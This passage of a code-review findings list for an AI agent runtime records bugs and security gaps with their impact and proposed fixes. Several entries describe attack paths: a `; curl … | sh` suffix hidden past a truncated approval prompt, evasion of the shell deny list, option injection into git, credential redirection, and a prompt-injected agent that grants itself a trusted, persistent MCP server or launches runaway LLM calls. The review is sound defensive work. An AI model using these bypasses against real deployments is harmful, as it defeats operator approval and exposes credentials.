impact: A user who runs `agent -u "new task"` in a workspace where the last plan finished gets 'plan is complete' and exit 0 without any work, a silent no-op.
fix: Only apply the completion short-circuit for cycles > 1, or archive/reset the plan when a new task is supplied on cycle 1.

title: Backfill writes to the legacy <workspace>/.agent/eventstore, not the central per-project data root, and is untested
impact: After Phase 8 central data roots, backfilled events land in a location the runtime may no longer read; concurrent append with a live process can interleave lines.
fix: Resolve the target through DataRoot/ProjectContext, add --project and --dry-run, refuse to run while a lock held by a live runtime exists, and add tests.

title: Data-home default documented as ~/.local/share on every OS
impact: On Windows/macOS the registry and per-project state go to a non-native location (or the docs are wrong), hurting the 'installable on any OS' goal and confusing backup/uninstall.
fix: Use the same platform resolution as enginePaths.js (XDG_DATA_HOME, ~/Library/Application Support/structured-ai, %LOCALAPPDATA%\structured-ai) and document it.

title: Settings overrides are process-global; concurrent projects in the web server share one mutable map
impact: Opening project B (or a console edit) changes model/approval/budgets for runs of project A that are already in flight; project isolation is not enforced at the config layer.
fix: Make settings layered per ProjectContext (global < user < project < run) with an explicit context object passed to get(), or AsyncLocalStorage-scoped overlays.

title: No tests for config schema/resolver/store, ConsoleAuth parsing or REPL failure paths
impact: The high-severity bugs above (silent swallow of invalid flags, project-file privilege escalation, REPL wedge) went unnoticed.
fix: Add unit tests for SettingsResolver/Store edge cases, a security test asserting a workspace project.json cannot set AGENT_APPROVAL/AGENT_BASE_URL/PROCESS_SANDBOX_MODE, and REPL tests with a fake readline that injects errors and SIGINT.

title: parallel_tool_calls (and tools) are sent even when the agent has no tools
impact: OpenAI rejects `tools: []` (array too short) and rejects parallel_tool_calls without tools with HTTP 400; several compatible servers do the same. 400 is not retryable and not a schema rejection, so the run fails outright for tool-less profiles (e.g. pure reviewers/discussion personas).
fix: Only include tools/parallel_tool_calls when tools.length > 0; make parallel_tool_calls a per-provider capability flag.

title: Temperature and max_tokens always sent - breaks reasoning models (o-series, GPT-5, some Anthropic/Gemini thinking modes)
impact: OpenAI reasoning models return 400 for non-default temperature and require max_completion_tokens instead of max_tokens; the run fails with a non-retryable error. Users of the strongest current models cannot use the runtime without a proxy rewriting the body.
fix: Add a model-capability registry (supports_temperature, token_param_name, supports_json_schema, supports_parallel_tools, max_output_tokens) and let the provider adapter drop/rename fields accordingly; on a 400 that names an unsupported parameter, drop it and retry once (like the existing schema degradation).

title: Prompt is many interleaved system messages; incompatible with providers/templates that allow one leading system message
impact: Anthropic Messages and Gemini take a single system field; many local chat templates (Mistral, Gemma, some llama.cpp/vLLM templates) reject multiple or non-leading system messages ('roles must alternate'). Some gateways silently keep only the first system message, dropping execution rules and the tool/agent catalogue.
fix: Assemble sections into one system message (or let the provider adapter merge them), keep stable sections first, and put volatile runtime state into a final user/developer message.

title: Volatile runtime_context placed near the top of the prompt defeats provider prompt caching
impact: OpenAI/Anthropic/Gemini prefix caching is invalidated after message 3 on every call, so the full (often 50k+ token) history is billed at uncached rates every iteration; latency also increases. For a multi-agent tree this multiplies cost significantly.
fix: Move dynamic fields into a small trailing message (or a tool result) and keep the leading system block byte-stable within a run; add Anthropic cache_control breakpoints in the Anthropic adapter.

title: No token usage / cost accounting on model calls
impact: No per-run/per-agent token or cost budget, no cost observability, no way to enforce spend limits across a delegation tree with up to MAX_TOTAL_AGENTS agents - a key observability and safety gap for an autonomous system.
fix: Normalize usage (input, output, cached, reasoning tokens) in the provider adapter, emit it on request:end, aggregate per run/agent in Observability, and add MAX_RUN_TOKENS / MAX_RUN_COST budgets checked in assertRunActive.

title: Registry hot-reload has no last-known-good fallback; a half-written JSON file crashes in-flight runs
impact: Editing agents.json/policy.json/tools.json while a run is active (the advertised use case) can throw mid-iteration from any accessor if the editor writes non-atomically or the JSON is briefly invalid, failing the run; the policy engine reload is also skipped inconsistently.
fix: Wrap reload in try/catch, keep serving REGISTRY.data, emit a registry:error event, and only swap after a successful load + validateRegistries(); optionally snapshot the registry at run start.

title: Structured content arrays (content parts) are mis-read as an action object
impact: validateAction then rejects the array ('Empty agent action.') and the run burns its malformed-response retries on a valid answer, ultimately failing.
fix: Normalize content first: if Array, join the text parts (type text/output_text) into a string and parse that; only accept a plain object as a pre-parsed action.

title: No tests for the HTTP transport edge cases and provider request shapes
impact: The bugs above (empty tools + parallel_tool_calls, content arrays, path comparison, reload crash) are exactly the regressions a multi-provider/multi-OS rollout will hit, with no CI signal.
fix: Add a mock-fetch transport test matrix (OpenAI, Anthropic-compat, Gemini-compat, Ollama, OpenRouter fixtures), a Windows CI job (GitHub Actions windows-latest), and unit tests for detectRepository/registry reload.

title: Closing a stdio server kills only the direct child; process trees (npx → node, uvx → python) are orphaned
impact: Leaked server processes accumulate across reloads (load() closes and recreates clients whenever a definition changes) and across runs. They hold ports, file locks and memory. This is worst on Windows, where cmd/npx wrappers are always present.
fix: On POSIX, spawn with `detached: true` and kill the negative PID (process group). On Windows, use `taskkill /pid <pid> /T /F`. Also kill all children on process exit (a process.on('exit') hook in the registry shutdown).

title: Content-Length framed input has no size ceiling (memory DoS) and quadratic buffering
impact: A buggy or malicious server that announces `Content-Length: 9999999999` or streams huge output makes the runtime buffer without bound until OOM. Large legitimate results cost O(n²) copying.
fix: Reject or discard frames whose declared length exceeds MCP_MAX_MESSAGE_BYTES, and cap the header search window. Use a chunk list with a total-length counter instead of repeated concat. Apply the same ceiling to EventStreamDecoder, the HTTP readJson chunks and WebSocket fragment accumulation.

title: HTTP transport treats empty-bodied 4xx/5xx responses as success
impact: A 401/403/404/500 with no body (common for auth failures and expired sessions) resolves as `undefined`. initialize then 'succeeds' with default capabilities, tools/list returns [], and auth errors appear as 'server has no tools' instead of a clear error.
fix: Check `statusCode >= 400` first. On 404 with an mcp-session-id, clear the session and re-initialize once, as the Streamable HTTP spec requires.

title: HTTP/SSE request 'timeout' is a socket idle timeout, not a call deadline
impact: tools/call over Streamable HTTP can hang far beyond MCP_CALL_TIMEOUT_MS, which stalls an agent step. Cancellation (AbortSignal) is not supported anywhere.
fix: Wrap each request in a hard deadline timer (or AbortSignal.timeout) that destroys the request. Thread a run-level AbortSignal through McpClient.callTool, and send `notifications/cancelled` on timeout or abort, for all transports.

title: SSE endpoint event can redirect POSTs, and the Bearer token, to another origin
impact: A compromised or spoofed SSE stream (or a proxy) can make the client send credentials and all tool arguments to an attacker-chosen host.
fix: Require postUrl.origin === streamUrl.origin, unless an explicit `allowCrossOriginEndpoint` is configured.

title: Tool schema reduction drops $defs, additionalProperties and annotations; no per-provider schema adaptation
impact: Servers built with pydantic/zod (which emit $defs and $ref) produce dangling refs that providers reject or misinterpret. Gemini and Anthropic each have their own schema subsets. Destructive tools are not escalated for approval automatically.
fix: Inline $refs and $defs, then run a provider-specific schema sanitizer in the LLM adapter layer. Feed `annotations.destructiveHint`/`openWorldHint` into PolicyEngine so they require approval by default.

title: Runtime-added stdio servers are persisted to a location that the trust policy then refuses to load
impact: A stdio server added with mcp_add or the console works in the current process but disappears from the catalogue after a restart or reload, with no explanation. Users then set MCP_TRUST_PROJECT_CONFIG=true globally, which also trusts malicious repo configs.
fix: Persist user-approved servers to a user-level config (e.g. ~/.structured-ai/mcp.json or the OS app-data dir) with source 'user', or record a hash-based approval list for workspace entries.

title: persist() writes resolved secrets in plaintext and silently drops `token`
impact: A header written as 'Bearer ${env:GITHUB_TOKEN}' ends up as the literal token in .agent/mcp.json, which is easily committed or shared. Token-authenticated servers lose auth after restart. Scope and timeouts are lost too.
fix: Persist the raw (unexpanded) definition, keep env placeholders, store secrets in the OS keychain or a secret store, and persist all normalized fields (scope, projects, timeouts, framing, token reference).

title: Reloading configuration kills the built-in semantic-engine sidecar
impact: In-flight semantic calls are rejected ('was shut down'), the sidecar restarts and the index warm-up is lost. The cycle repeats on every config change.
fix: Keep built-in clients in a separate map (or mark them so load() keeps `config.builtin` clients), and register built-ins through an explicit manager API instead of mutating `clients`.

title: Tests miss strict-NDJSON servers, server→client requests, Windows spawn and trust bypass
impact: The critical interoperability and security regressions above pass CI.
fix: Add conformance tests against the official @modelcontextprotocol/sdk server (strict NDJSON), negative security tests for trust/approval, fuzz tests for the decoders, and a Windows CI matrix job.

title: Lost updates on shared memory.json across concurrent agents (read-modify-write across awaits)
impact: Two sub-agents folding concurrently load the same base and the last save overwrites the other's facts; sub-agent memory also pollutes the main agent's memory.
fix: Serialise folds per data root (in-process mutex) and re-load + merge right before save; consider per-scope memory with explicit promotion; add a lock file for multi-process.

title: Event-store readDay corrupts multi-byte UTF-8 at 64 KiB chunk boundaries
impact: Replayed events contain corrupted text, or the line fails JSON.parse and is silently dropped — the 'source of truth' loses events for non-ASCII users.
fix: Use string_decoder.StringDecoder (write/end) or split on 0x0A at the Buffer level before decoding; add a boundary test.

title: Registry file is synchronously read and parsed on every emitted event
impact: Blocking sync disk I/O on the event-loop hot path for every streamed event; worse with many sub-agents and on Windows with AV scanning.
fix: Cache the parsed registry with mtime invalidation, memoise project_id→dataRoot, and return null instead of throwing for unknown ids.

title: Archive and session indexes have no cross-process locking (lost updates, duplicate record ids)
impact: CLI and web server (or two servers) on the same project overwrite each other's index; two processes can issue the same archive id and readBody returns the first matching line — the wrong body.
fix: Add a lockfile helper (O_EXCL create + stale timeout) for every index/registry RMW, or move indexes to SQLite (WAL), which also provides FTS search.

title: AtomicFile has no fsync and no retry for Windows rename EPERM/EBUSY
impact: On Windows, rename onto a file held open by antivirus/indexer/editor commonly fails with EPERM/EACCES/EBUSY, making session/registry/memory saves fail intermittently; after power loss on Linux the file can be zero-length.
fix: Retry rename with backoff on EPERM/EACCES/EBUSY on win32 (graceful-fs style); fsync temp fd before rename and the directory after; or adopt write-file-atomic.

title: Project root canonicalisation differs from WorkspaceBoundary and is case-sensitive on Windows/macOS
impact: On Windows 'C:\\Proj' vs 'c:\\proj' (or an 8.3 short path) registers two projects with separate data, findByRoot misses, and assertWorkspaceMatch throws a spurious mismatch.
fix: Canonicalise with the same native realpath helper everywhere and compare/hash a normalised key (lowercased on case-insensitive volumes); add path.win32 tests.

title: Archive keyword search ignores all non-ASCII text
impact: A Persian/Arabic/CJK query yields zero terms, so searchArchive returns the whole archive ranked only by importance/recency; non-ASCII titles/errors are never matchable.
fix: Tokenise with Unicode classes: split(/[^\p{L}\p{N}_.-]+/u) with NFKC + toLocaleLowerCase; longer-term use SQLite FTS5 or embeddings.

title: Compaction notices accumulate as extra system messages mid-conversation
impact: Notices pile up on long runs (consuming budget); Anthropic (system only top-level) and Gemini (systemInstruction) reject or mishandle interleaved system messages, blocking the multi-provider goal unless every adapter rewrites them.
fix: Replace an existing notice in place; represent memory/notices via a dedicated context slot that provider adapters map to their system prompt or a user-role data block.

title: Context budget is character-based, not token- or model-aware
impact: Chars-per-token varies 2-4x across models and scripts, so compaction triggers too late (context-length errors) or too early; no awareness of each provider's window.
fix: Add a provider-aware token estimator and derive the budget from the selected model's context window minus max_tokens.

title: Event payload can overwrite envelope fields (seq, type, at)
impact: Breaks monotonic seq ordering used by eventstore seq_from/seq_to queries and replay; a malformed payload throws inside the emitting business code and can abort a run.
fix: Spread payload first and assign envelope fields after (or strip reserved keys); in production log + emit a diagnostic instead of throwing on validation failure.

title: Global singletons (WORKSPACE_ROOT at module load, process-global settings overlay, openedProjectId) block true multi-project hosting
impact: A server hosting several projects applies one project's settings to all runs, and requiring the module from a non-existent cwd crashes the process.
fix: Resolve settings overlays per run via the run's ProjectContext (AsyncLocalStorage), compute workspace root lazily, and remove remaining WORKSPACE_ROOT fallbacks in persistence.

title: Missing tests for critical edge cases in this area
impact: The high-severity issues above can regress unnoticed; Windows behaviour is not exercised.
fix: Add targeted unit tests for each and a windows-latest/macos-latest CI matrix.

title: Approval and the actual MCP call can resolve to different servers (server/tool parsing disagree)
impact: `mcp_call {server:"benign", tool:"mcp__sensitive__delete"}` gets its gateway approval and cache entry under "benign" but runs on "sensitive". A cached approval for one global server then lets calls go through to another.
fix: Use one shared resolver (e.g. McpManager.resolveCallTarget(args)) in both the policy and the tool. Reject calls whose args.server conflicts with the server in a namespaced tool name.

title: Destructive-shell deny list is easy to evade and has no Windows/PowerShell coverage
impact: These denies are presented as a safety net (they apply even when AGENT_APPROVAL=auto), but they only stop the textbook spellings. In auto mode, or once an operator approves a harmless-looking command, the real protection is close to zero. On Windows there is none.
fix: Describe these as best-effort only. Add the 'm' flag and per-OS pattern packs (PowerShell/cmd). Parse commands with a real shell tokenizer (e.g. shell-quote / PowerShell AST) and match on argv[0] basename. Above all, rely on a sandbox (container/VM, restricted user, read-only mounts) for actual containment.

title: Policy rules written with `condition` pass validation but the condition is ignored at evaluation
impact: A rule like `{tools:["terminal_exec"], condition:{argument_matches:{command:["^ls"]}}, action:"allow"}` validates fine and then allows every terminal_exec call, which is fail-open and overrides the earlier require_approval because the last match wins.
fix: Pick one key. Either have the matcher read `rule.when ?? rule.condition`, or (better) reject `condition` and any other unknown rule fields in policyProblems. Add a JSON schema for policy.json.

title: Repository-supplied hooks (.agent/project.json) run with no trust gate, unlike project MCP stdio servers
impact: With HOOKS_ENABLED=true, cloning and running on an untrusted repository executes the hooks it declares (terminal_exec, agent delegations, git commits) on every task. This is the same class of risk as VS Code tasks / git hooks. Policy approval is the only barrier, and it's off in auto mode.
fix: Add a HOOKS_TRUST_PROJECT_CONFIG setting, or a per-workspace 'trust this folder' record keyed by the hash of the hooks section, and require re-approval whenever it changes. Show project-declared hooks to the operator before their first run.

title: Hooks bypass agent-profile allowlists and always run as main_agent
impact: A policy can't tell hook-initiated calls apart (e.g. 'hooks may only run npm test'). Agent-profile restrictions don't apply, and audit events show them as the main agent.
fix: Pass a distinct agent identity (e.g. `hook:<id>`) into PolicyEngine.enforce, add an allowlist per hook/phase, and record the hook id in the policy decision event.

title: Malformed hook configuration throws out of runHooks / applyAfterTaskHooks instead of being reported
impact: A typo in .agent/project.json (or a tool removed from tools.json) makes the whole run fail at the hook boundary, possibly after the main task has already done its work, and the final action/answer is lost. It can also retry after_task hooks on a later path.
fix: Catch configuration errors in runHooks and return a phase report with a single failed 'config' entry (honoring HOOKS_ON_FAILURE). Validate hook config at startup or project-open time. Set after_hooks_ran in a finally block.

title: dirtyPathsFromStatus mishandles quoted porcelain paths (spaces, Unicode, Windows)
impact: A before_task safety-commit hook passes literal quoted strings to git_add, which fails or stages the wrong path. Repos with Unicode or space-containing filenames (common on Windows/macOS) can't get a safety snapshot. A filename containing ' -> ' is also split wrongly.
fix: Run `git status --porcelain=v1 -z` (NUL separated, unquoted, rename pairs as separate fields) and parse that, or unquote C-style escapes.

title: Terminal approval prompt shows only the first 300 chars of args and doesn't sanitize control characters
impact: A long command can push its dangerous part past the 300-char cutoff (e.g. 290 chars of benign padding then `; curl … | sh`), so the operator approves something they never saw. Escape sequences in arguments can also rewrite the terminal line to spoof the prompt.
fix: Show the full command (or a hash plus an expandable view), mark clearly when output is truncated, strip and escape control characters, and default-deny anything that can't be fully displayed.

title: Concurrent approvals in TTY mode open several readline interfaces on the same stdin
impact: When two parallel tool calls need approval in non-REPL CLI mode, the prompts interleave and a single 'y' can be consumed by the wrong question or by both, so the operator may approve something they didn't intend.
fix: Serialize approvals through a FIFO queue in ApprovalManager, whatever the handler type, and include a request id in each prompt.

title: Policy layer has no regression tests for the shipped deny rules on Windows paths, process_write or mcp_call+restricted
impact: The security bypasses in this review would pass CI.
fix: Add a table-driven 'adversarial policy corpus' test: Windows paths, mixed separators, evasive shell spellings, process_write, both mcp_call shapes, gateway cache vs mode changes, and concurrent approvals.

title: tool_groups.json 'default_policy', 'sensitive' and 'note' fields are documentation only and never enforced
impact: Operators may think that editing default_policy changes enforcement. Security behavior is spread across policy.json, tool_groups.json and code comments, and they can silently disagree.
fix: Either derive policy rules from the group's default_policy at load time, or delete the field and have the validator check that every group with sensitive=true has at least one require_approval/deny rule.

title: Unbounded discussion cost: duplicate personas are accepted and discussion_start needs no approval
impact: A model (or prompt injection) can call discussion_start with hundreds of repeated personas and max_rounds=10, which means thousands of LLM calls in one tool call with no approval and no token budget. Duplicates also cannot see each other, because formatForPersona filters by persona id.
fix: Remove duplicate persona ids, cap them at PERSONAS.length (or a setting), estimate the cost (personas x rounds + observer calls) and require approval above a threshold. Thread the runtime run budget and an AbortSignal through the engine.

title: Observer and persona prompts grow without bound and can overflow the context window
impact: Late rounds hit context-length errors, especially on local or smaller models. Because the engine does not catch per-call errors, the whole discussion fails.
fix: Budget by tokens: keep the last N rounds verbatim and summarize older ones (for example with the observer's previous agreements/open_points). Make the budget configurable per model profile.

title: One failed persona call aborts the whole discussion, and sibling calls keep running
impact: A single 429, timeout or malformed response from one of 15 personas fails the discussion and discards earlier rounds' value. In-flight calls keep consuming tokens after the rejection. There is no way to cancel from the UI or CLI.
fix: Wrap each persona call with per-call timeout, retry and backoff, and record a failed message ('persona unavailable') instead of throwing. Use an AbortController that is cancelled on failure or user cancel. Isolate callback errors.

title: The standalone LLM caller has no timeout and supports only OpenAI-compatible Bearer APIs
impact: A stalled endpoint hangs the discussion forever (web server fallback path, ServerImplementation.js:1409). Anthropic Messages, Gemini or Azure-style auth headers cannot be used, which blocks the 'any LLM provider' goal for this feature.
fix: Remove the bespoke fetch and route every call through a single provider abstraction (adapters for OpenAI/Anthropic/Gemini/Ollama, with AbortSignal.timeout and retries). Have createLlmCaller accept only that interface.

title: Persona tool lists are declared but never used, and the agents.json discussion_* entries contradict the 'personas do not act' claim
impact: Personas reason without workspace evidence, which encourages hallucinated claims about the codebase. If one of these agents is ever delegated to or given tools, write and shell rights the discussion was documented not to need appear silently. The config is misleading in either case.
fix: Pick one model. Either give personas a read-only tool loop (fs_read, search, code_*) under policy, or strip the tool lists from personas.js and agents.json. Never grant write or shell tools to deliberation personas.

title: Persona definitions are duplicated in personas.js, registry/personas.json and agents.json
impact: Editing the registry, which is the documented live-reload source, has no effect on discussions. The three copies will drift.
fix: Build PERSONAS from the registry (personas.json + agents.json discussion_* entries) through RegistryLoader. Add a validator check that every discussion persona has a matching registry entry.

title: The legacy tools.json is still the source of truth for HookLoader, while the runtime uses tool-schemas/
impact: Adding a tool only to tool-schemas/ (the documented location) makes hooks referencing it fail validation, and tools.json changes never affect the runtime. Contributors cannot tell which file is authoritative.
fix: Remove tools.json, or generate it at build time, and point HookLoader at registryLoader.loadToolSchemas(). Have tool-schemas be discovered by glob instead of the hard-coded TOOL_SCHEMA_FILES list.

title: RegistryValidator does not catch duplicate names or malformed entries
impact: Two schema files declaring the same tool (now easy with split files), or two agents with the same name, lead to last-writer-wins behavior with no error. A schema entry missing 'function' crashes startup with an unclear message.
fix: Detect duplicates per registry and report them, guard against a missing or invalid function.name, and validate each file against a JSON Schema (tool schema, agent schema, skill schema) before cross-referencing.

title: Discussion internals have no unit tests (loop detection, observer parsing, policy regex variants)
impact: The fragile paths identified above can regress silently, and the security rules have no negative tests.
fix: Add table-driven tests: observer outputs (fenced, preamble, invalid), the loop detector with empty or near-duplicate text, validateRequest with duplicates, the policy matcher with backslash, './', '//' and case variants plus 'git push -f' and 'Remove-Item -Recurse', and the validator with duplicate tool names.

title: Retry backoff sleep ignores run cancellation
impact: A cancelled/deadlined run keeps sleeping and then fires another provider request; UI 'stop' feels broken and tokens may be spent after cancel.
fix: Use timers/promises setTimeout(delay, undefined, { signal: currentRun().cancellation.signal }) and call h.assertRunActive() before each attempt.

title: Concurrent sibling sub-agents overwrite each other's event scope/iteration
impact: Events that do not pass scope/iteration explicitly (e.g. response:repaired in normalizeToolCalls, context:compacted, host-emitted model/response events) are attributed to whichever sibling last set the context; the parent also inherits the last child's scope until its next iteration. Observability/console trees become wrong under parallel delegation.
fix: Wrap each sub-agent (and each main iteration) in events.runWithScope({...current, scope, iteration}) so every agent gets its own store, and make setContext copy-on-write. Add a test with two parallel children emitting scope-less events.

title: Synchronous git subprocess blocks the event loop for all concurrent runs
impact: On large repos (or Windows with AV scanning, untracked node_modules) each call can take seconds; while it runs no other run, SSE stream, MCP heartbeat or timer progresses. Breaks the multi-run server model RunScheduler is built for.
fix: Switch to async execFile (promisified) with an AbortSignal, cache the result per run for a short TTL, and avoid --untracked-files=all (use 'normal' plus ignore rules).

title: Windows: cross-drive absolute paths are accepted as 'relative' provenance
impact: changedFiles() can list files outside the workspace (and an automatic commit hook relying on it can misbehave); the same file may appear twice ('Src/a.js' from tool args vs 'src/a.js' from git).
fix: After relative(), reject results that are absolute (path.isAbsolute) or contain a drive prefix; normalise case on win32/darwin (or resolve with fs.realpathSync.native) before set insertion. Add win32 path tests using path.win32.

title: Claim verification treats failed tool calls as 'executed'
impact: An agent that tried fs_write and failed can claim files_changed without a report:mismatch; the anti-hallucination check gives false assurance. In legacy mode executedToolNames(undefined) returns process-wide history across previous runs, masking mismatches further.
fix: Track successful tool names (and changed paths) separately and verify claims against them; compare files_changed against changedFiles(runId). Always pass a run id.

title: Sub-agent reports success:true even when it returns an error
impact: A child that gave up (error.code NEEDS_INPUT / failed) is indistinguishable from a successful one to the scheduler, to delegation:end telemetry and to dependent delegations; sub-agent hallucinated 'performed' claims are never checked.
fix: Set success = !action.error, propagate failure into the graph result, and run ReportVerifier for sub-agents using per-scope tool tallies.

title: Unscoped runs bypass the scheduler and all worker limits
impact: Any caller that starts runs without a project can launch unlimited concurrent runs (LLM spend, shell processes, memory) — a DoS vector for a server deployment; 'per user' limits are not actually per user.
fix: Route unscoped runs through a default key (e.g. '__default__'), include a tenant/user id in the scheduler key, and enforce a global inflight cap. Add queue wait timeouts.

title: Tool arguments and full results are emitted on the event bus without redaction
impact: Tokens passed to shell/GitHub/HTTP tools, env dumps, or file contents with credentials flow into logs, SSE consoles and any persisted event store. For a GitHub/MCP/browser-capable agent this is a credential-leak path.
fix: Add a redaction stage (known secret patterns, env values of configured API keys, fields named token/password/authorization) before emit/log, and cap result size in events.

title: runtime_context.json hard-codes limits and advertises approval_system:false
impact: The model is told static limits that can disagree with the actual settings, and the runtime itself has no human-approval step for dangerous tool calls — only POLICY_ENGINE.enforce, which is allow/deny.
fix: Generate the limits section from settings at runtime; add an approval gate in executeToolGraph (before toolRuntime.executeTool) that can pause the graph and await an operator decision via the event bus/UI, with per-tool risk classes.

title: Unguarded symlink creation breaks tests on Windows (EPERM)
impact: Without Developer Mode or admin rights, Windows throws EPERM, so the boundary tests fail. Symlink-escape protection is security-critical and goes unchecked on Windows, where junctions are the usual escape vector.
fix: Use 'junction' for directory links on win32 and point them at a temp directory outside the workspace, not /etc. Wrap creation in try/catch with an explicit skip, as project-tools.test.js does. Add a Windows junction-escape test.

title: Discussion test hard-codes /tmp and reuses a real WORKSPACE_ROOT from the environment
impact: On Windows, mkdtemp('/tmp/...') resolves to <drive>:\tmp, which usually does not exist, so it throws ENOENT. On any OS, a developer who exported WORKSPACE_ROOT for real use gets test transcripts written into their real project. Temp directories also pile up between runs.
fix: Always use `fs.mkdtempSync(path.join(os.tmpdir(), 'agent-discussion-'))`, ignore the inherited WORKSPACE_ROOT (or fail if it is set), and remove the directory in a finally block.

title: The test normalizer only recognises POSIX temp paths
impact: On Windows, temp paths such as C:\Users\x\AppData\Local\Temp\agent-... (with backslashes) are not normalised. Fixture and contract comparisons are machine-dependent there, and paths can leak into snapshots.
fix: Build the pattern from `os.tmpdir()` (escaped, matching both separators and fs.realpathSync variants) in addition to the POSIX defaults, and normalise backslashes before comparing. Add a win32 path case to normalize.test.js.

title: The workflows under structured-ai/ci/ are dead and point at the wrong paths
impact: Readers may think these gates (golden snapshot, performance budget, partial suites) protect structured-ai when they never run. The two CI definitions diverge and create confusion.
fix: Delete structured-ai/ci/ or move any useful steps into the root .github/workflows. Keep one source of truth for CI.

title: The structured-ai CI job never builds semantic-engine, so the gateway integration test always skips
impact: The only real end-to-end test of the agent↔Semantic Gateway path (project isolation, index generation) reports green in CI without running. Regressions in multi-project semantic isolation ship undetected.
fix: In CI, build semantic-engine first (a needs: dependency or a shared job) and set an env flag such as REQUIRE_SEMANTIC_GATEWAY=1 that turns the skip into a failure.

title: docker-compose.yml is broken in this folder and has no structured-ai service
impact: `docker compose up` from structured-ai fails at build time. There is no one-command way to run agent, console and semantic gateway together, which the packaging and installer goal needs.
fix: Move the compose file to the repo root, or set `context: ..`. Add a `structured-ai` service (console on 127.0.0.1, token from secret, volume for STRUCTURED_AI_DATA_HOME) wired to the gateway URL.

title: The serial `&&` test chain hides later failures and has no timeouts
impact: The first failing file aborts the run, so later regressions stay invisible until it is fixed. A hung child or server can stall CI up to the 6-hour default. New test files must be added to the chain by hand or they never run. 59 copies of the harness drift apart (some print stacks, some only messages, some never .catch main()).
fix: Move to the built-in `node:test` runner (`node --test test/`, zero dependencies) with per-test timeouts, automatic discovery and aggregated reporting. Or add a small runner script that globs test/**/*.test.js, runs each with a timeout, and reports all results before exiting non-zero.

title: Known-flaky and failing suites are documented but not quarantined
impact: With the `&&` chain, one flaky web or mvp test makes `npm test` red at random. Path-length-sensitive assertions fail on Windows/macOS, where temp paths are longer. The README still claims 694/694.
fix: Make the web tests deterministic (event-driven waits instead of an 8s waitFor polling loop, per-test fresh server and env). Express the I-12 budget relative to the measured fixed overhead rather than an absolute 30000. Track flaky tests in a quarantine list that runs separately, and keep the documentation in sync automatically from CI output.

title: Redirect responses are never drained, leaking sockets
impact: Each redirect keeps a socket and buffered body alive until timeout/GC; long runs accumulate open handles.
fix: Call response.resume() (or destroy()) before following the redirect.

title: Response body keeps downloading past the cap and splits UTF-8 across chunks
impact: Huge or endless responses are downloaded until the timeout; multibyte characters at chunk boundaries become U+FFFD (corrupts non-ASCII pages such as Persian text).
fix: Use string_decoder.StringDecoder, destroy the response once the char/byte cap is reached, clamp timeout_ms to a setting.

title: Git option injection through branch/name arguments
impact: git_checkout with an option-shaped value can discard uncommitted work or switch state unexpectedly while the approval prompt looks innocuous.
fix: Reject values starting with '-', validate with `git check-ref-format --branch`, insert '--end-of-options' before user values, clamp limit to 1..500.

title: Search path globs break on Windows because relative paths use backslashes
impact: Path-pattern file searches silently return nothing on Windows; models see inconsistent path formats across OSes.
fix: Normalise relative paths to POSIX separators before matching and in returned results.

title: code_rename applies same-line edits in the wrong order and writes non-atomically
impact: Renaming an identifier appearing twice on one line corrupts code; partial multi-file renames leave the tree inconsistent and bypass the filesystem tools' atomic write/checkpoint path.
fix: Sort by (line desc, character desc); compute all new contents first, then write via AtomicFile / the WriteTools pipeline with checkpoint.

title: Model can mark its own runtime-added MCP server as trusted and persist it
impact: After one approval (or with AGENT_APPROVAL=auto) a prompt-injected agent installs a persistent stdio process with self-assigned trust that survives future runs, and its tools are then auto-allowed.
fix: Ignore trust from model arguments (force restricted for agent-added servers), default persist=false, show command/args/env prominently in the approval, default MCP_ALLOW_RUNTIME_ADD=false.

title: Discovered MCP tool lookups are not project-scoped while mcp_tools is
impact: Tools of a server scoped to project A may be declared to and callable by a run of project B through the mcp__<server>__<tool> path, contradicting the trust-scope design (depends on McpManager defaults, not fully traced).
fix: Thread the effective project id into every catalogue lookup and check serverVisibleTo in executeDiscovered before calling.

title: Plan phase reported 'done' when all its steps are blocked or skipped
impact: The orchestrator believes the plan is complete and stops while work is actually blocked.
fix: Treat 'blocked' as open (or add a blocked phase status) and require at least one done step for 'done'.

title: Plan read-modify-write is not serialised across concurrent agents
impact: Parallel sub-agents updating different steps lose each other's updates (last writer wins).
fix: Wrap load-modify-save in a per-project mutex plus a lockfile or revision field (compare-and-swap with retry).

title: Skills tied to MCP servers other than semantic-engine are never active; skills load only from the install dir
impact: No skills for GitHub/browser/DB MCP servers, no per-project or per-user skills; a global npm install makes the skills dir effectively read-only.
